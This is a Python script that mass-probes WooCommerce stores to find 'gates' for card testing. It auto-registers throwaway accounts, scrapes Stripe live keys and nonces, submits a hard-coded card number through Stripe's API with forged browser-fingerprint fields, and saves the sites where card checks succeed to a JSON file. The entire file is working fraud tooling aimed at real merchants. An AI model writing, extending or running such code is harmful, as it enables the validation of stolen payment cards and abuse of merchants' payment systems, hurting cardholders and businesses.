# language: Python 3.12+, file: advanced_gate_scanner.py, target: Windows 11
import asyncio
import json
import os
import random
import re
import socket
import string
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
import aiohttp

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
PROBE_DUMMY_CARD = {"number": "5175465382242090", "mm": "09", "yy": "2030", "cvc": "018"}

def rand_str(k=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def resolve_dns(host: str) -> str | None:
    try:
        socket.gethostbyname(host)
        return host
    except Exception:
        return None


async def probe_stage1_dns_and_form(session: aiohttp.ClientSession, domain: str) -> dict | None:
    """
    Stage 1: Fast GET /my-account/ — check availability, Cloudflare blocks, 
    and verify woocommerce-register-nonce presence before attempting costly POST.
    """
    base = f"https://{domain}"
    url = f"{base}/my-account/"
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), ssl=False, allow_redirects=True) as r:
            if r.status != 200:
                return None
            html = await r.text(errors="replace")
            headers = dict(r.headers)
            final_url = str(r.url)
    except Exception:
        return None

    # Check Cloudflare bot blocks
    is_cf = (
        "cf-ray" in headers or 
        "cf_clearance" in str(headers) or 
        "Just a moment..." in html or 
        "Attention Required! | Cloudflare" in html or
        "challenge-platform" in html
    )
    
    # Fast regex for open WooCommerce registration
    reg_nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
    reg_nonce = reg_nonce_m.group(1) if reg_nonce_m else None
    
    pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', html)
    pk_live = pk_m[0] if pk_m else None

    return {
        "domain": domain,
        "base": base,
        "final_url": final_url,
        "cf_blocked": is_cf,
        "reg_nonce": reg_nonce,
        "pk_live": pk_live,
    }


async def probe_stage2_3_4_full_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore) -> dict | None:
    """
    Stage 2: Real registration POST -> check wordpress_logged_in.
    Stage 3: Scrape /my-account/add-payment-method/ -> extract pk_live, upe_nonce / legacy_nonce.
    Stage 4: Live SetupIntent confirm probe -> distinguish LIVE gate from testmode/broken.
    """
    async with sem:
        jar = aiohttp.CookieJar(unsafe=True)
        headers = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"
        }
        
        async with aiohttp.ClientSession(headers=headers, cookie_jar=jar) as s:
            # === STAGE 2: Real registration POST ===
            uname = rand_str(10)
            email = f"{uname}@mailnesia.com"
            pwd = f"Sec_{rand_str(8)}!9a"
            body = {
                "username": uname,
                "email": email,
                "password": pwd,
                "woocommerce-register-nonce": initial_nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            post_headers = {
                "Origin": base,
                "Referer": f"{base}/my-account/",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            try:
                async with s.post(f"{base}/my-account/", data=body, headers=post_headers, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=12)) as r:
                    await r.text(errors="replace")
            except Exception:
                return None

            cookies = {c.key: c.value for c in s.cookie_jar}
            if not any("wordpress_logged_in" in k for k in cookies):
                # Bot challenge or closed registration
                return None

            # === STAGE 3: Authenticated Scrape /my-account/add-payment-method/ ===
            add_pm_url = f"{base}/my-account/add-payment-method/"
            try:
                async with s.get(add_pm_url, ssl=False, timeout=aiohttp.ClientTimeout(total=12)) as r:
                    pm_html = await r.text(errors="replace")
            except Exception:
                return None

            pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
            pk = pk_m[0] if pk_m else ""
            
            upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
            upe_nonce = upe_m.group(1) if upe_m else ""
            
            legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', pm_html)
            legacy_nonce = legacy_m.group(1) if legacy_m else ""

            if not pk or (not upe_nonce and not legacy_nonce):
                return None

            # === STAGE 4: SetupIntent Live Mode Confirmation Probe ===
            fp = {
                "guid": str(uuid.uuid4()),
                "muid": str(uuid.uuid4()),
                "sid": str(uuid.uuid4())
            }
            tok_body = {
                "type": "card",
                "billing_details[name]": "Alex Vance",
                "billing_details[address][postal_code]": "10001",
                "billing_details[address][country]": "US",
                "card[number]": PROBE_DUMMY_CARD["number"],
                "card[cvc]": PROBE_DUMMY_CARD["cvc"],
                "card[exp_month]": PROBE_DUMMY_CARD["mm"],
                "card[exp_year]": PROBE_DUMMY_CARD["yy"],
                "guid": fp["guid"],
                "muid": fp["muid"],
                "sid": fp["sid"],
                "pasted_fields": "number,cvc",
                "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
                "referrer": base,
                "time_on_page": "32100",
                "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "card-element",
                "client_attribution_metadata[merchant_integration_version]": "2017",
                "key": pk,
            }
            tok_headers = {
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "Accept": "application/json"
            }
            try:
                async with s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers,
                                  ssl=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                    tok_data = await r.json(content_type=None)
            except Exception:
                return None

            if "id" not in tok_data:
                # Key dead or blocked
                return None

            pm_id = tok_data["id"]

            # Perform SetupIntent confirm call
            ajax_headers = {
                "Origin": base,
                "Referer": add_pm_url,
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
            }
            
            confirm_payload = {}
            ajax_endpoint = f"{base}/wp-admin/admin-ajax.php"
            
            if upe_nonce:
                confirm_payload = {
                    "action": "wc_stripe_create_and_confirm_setup_intent",
                    "_ajax_nonce": upe_nonce,
                    "wc-stripe-payment-method": pm_id,
                    "wc-stripe-payment-type": "card",
                }
            elif legacy_nonce:
                ajax_endpoint = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"
                confirm_payload = {
                    "stripe_source_id": pm_id,
                    "nonce": legacy_nonce,
                }

            try:
                async with s.post(ajax_endpoint, data=confirm_payload, headers=ajax_headers,
                                  ssl=False, timeout=aiohttp.ClientTimeout(total=12)) as r:
                    conf_resp = await r.json(content_type=None)
            except Exception:
                return None

            raw_str = json.dumps(conf_resp).lower()
            
            # Check for dead/restricted testmode
            if "testmode_charges_only" in raw_str or "secret_key_required" in raw_str or "api_key" in raw_str:
                return None

            # Confirm real bank/issuer interaction or success
            is_live_verdict = (
                conf_resp.get("success") is True or
                "declined" in raw_str or
                "incorrect" in raw_str or
                "requires_action" in raw_str or
                "card_error" in raw_str or
                "error" in conf_resp
            )

            if is_live_verdict:
                return {
                    "domain": domain,
                    "base_url": base,
                    "reg_url": f"{base}/my-account/",
                    "add_pm_url": add_pm_url,
                    "ajax_url": ajax_endpoint,
                    "pk_live": pk,
                    "gate_type": "wc_stripe_upe" if upe_nonce else "wc_stripe_legacy",
                    "upe_nonce": upe_nonce,
                    "legacy_nonce": legacy_nonce,
                    "updated_at": int(time.time()),
                    "status": "READY"
                }

    return None


async def main():
    print("=" * 80)
    print("[*] ADVANCED GATE SCANNER v2 — 4-STAGE SETUPINTENT QUALIFICATION ENGINE")
    print("=" * 80)
    
    # 1. Load candidate domains
    domains = []
    candidates = [
        "data/harvested_domains.txt", "data/probe_targets.txt",
        "harvested_domains.txt", "probe_targets.txt"
    ]
    for fn in candidates:
        if os.path.exists(fn):
            try:
                with open(fn, encoding="utf-8") as f:
                    domains.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
            except Exception:
                pass

    # Sanitize
    cleaned = []
    for d in domains:
        d = re.sub(r'[^a-z0-9.-]', '', d.strip().lower())
        if d and "." in d and not d.endswith("."):
            cleaned.append(d)
    raw_domains = sorted(list(set(cleaned)))
    print(f"[*] Loaded {len(raw_domains)} raw candidate domains from harvested lists.", flush=True)

    # 2. Pre-resolve DNS
    print("[*] Stage 0: Resolving DNS...", flush=True)
    live_dns_domains = []
    with ThreadPoolExecutor(max_workers=40) as pool:
        results = pool.map(resolve_dns, raw_domains)
        for r in results:
            if r:
                live_dns_domains.append(r)
    print(f"[+] DNS Live: {len(live_dns_domains)} / {len(raw_domains)}", flush=True)

    # 3. Stage 1: Fast GET /my-account/ (Non-POST reg-nonce and CF check)
    print(f"\n[*] Stage 1: Fast GET /my-account/ surface probing on {len(live_dns_domains)} domains...", flush=True)
    sem_s1 = asyncio.Semaphore(30)
    headers = {"User-Agent": UA}
    conn = aiohttp.TCPConnector(ssl=False, limit=60)
    
    async with aiohttp.ClientSession(headers=headers, connector=conn) as session:
        async def run_s1(d):
            async with sem_s1:
                return await probe_stage1_dns_and_form(session, d)
        
        s1_tasks = [run_s1(d) for d in live_dns_domains]
        s1_results = await asyncio.gather(*s1_tasks)

    s1_passed = [r for r in s1_results if r and not r["cf_blocked"] and r["reg_nonce"]]
    print(f"[+] Stage 1 Passed: {len(s1_passed)} clean domains with open registration forms (no CF captcha).")
    for s in s1_passed[:10]:
        print(f"    -> {s['domain']} (reg_nonce={s['reg_nonce']}, pk_preview={s['pk_live'][:20] if s['pk_live'] else 'none'})")
    if len(s1_passed) > 10:
        print(f"    ... and {len(s1_passed) - 10} more.")

    # 4. Stages 2, 3, 4: Deep Qualification
    print(f"\n[*] Stages 2-4: Deep Qualification (Session Reg -> Scrape Nonces -> Confirm Probe)...", flush=True)
    sem_deep = asyncio.Semaphore(10)
    deep_tasks = [
        probe_stage2_3_4_full_qualification(s["domain"], s["base"], s["reg_nonce"], sem_deep)
        for s in s1_passed
    ]
    deep_results = await asyncio.gather(*deep_tasks)
    ready_gates = [r for r in deep_results if r]

    print("\n" + "=" * 80)
    print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES FOUND: {len(ready_gates)}")
    print("=" * 80)
    
    for g in ready_gates:
        print(f"  [READY] {g['domain']:32} | Type: {g['gate_type']:18} | PK: {g['pk_live'][:24]}...")

    # Save to data/ready_gates.json
    os.makedirs("data", exist_ok=True)
    ready_file = os.path.join("data", "ready_gates.json")
    with open(ready_file, "w", encoding="utf-8") as f:
        json.dump(ready_gates, f, indent=2)
    print(f"\n[+] Full extracted context saved to {ready_file}")

    # Also update active_surfaces.json for backwards compatibility
    active_file = os.path.join("data", "active_surfaces.json")
    with open(active_file, "w", encoding="utf-8") as f:
        json.dump(ready_gates, f, indent=2)


if __name__ == "__main__":
    asyncio.run(main())
